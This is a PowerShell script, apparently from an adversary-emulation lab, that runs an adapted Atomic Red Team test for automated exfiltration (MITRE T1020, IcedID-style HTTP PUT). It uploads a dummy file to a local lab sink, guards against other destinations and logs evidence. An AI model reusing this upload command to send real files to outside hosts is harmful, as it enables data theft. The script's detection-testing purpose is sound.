# ATA056 - T1020 Automated Exfiltration (Windows)
# ART tal cual: atomic T1020 "IcedID Botnet HTTP PUT" (guid 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0).
# Unica adaptacion: input_arguments `file` y `domain` apuntan al laboratorio local.
# Guardarrail: la URL debe ser 192.168.65.1:9090 (sink del HOST); si no, aborta.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$url = 'http://192.168.65.1:9090/upload/ATA056'
if ($url -notlike 'http://192.168.65.1:9090/*') {
    'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}

$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$fileName = Join-Path $dir 'T1020_exfilFile.txt'

# --- comando ART (9c780d3d) ---
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
$status = ''
try {
    $r = Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName -UseBasicParsing
    $status = "HTTP=" + [int]$r.StatusCode
} catch {
    $status = "ERROR=" + $_.Exception.Message
}
# --- fin comando ART ---

$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$sha = (Get-FileHash $fileName -Algorithm SHA256).Hash.ToLower()
@(
    "ata=ATA056",
    "tecnica=T1020",
    "fuente=ART",
    "guid=9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0",
    "t0=$t0",
    "t1=$t1",
    "url=$url",
    "file=$fileName",
    "sha256=$sha",
    "resultado=$status"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
@("t0=$t0", "t1=$t1") | Out-File -FilePath (Join-Path $ev 'times.log') -Encoding ascii
exit 0
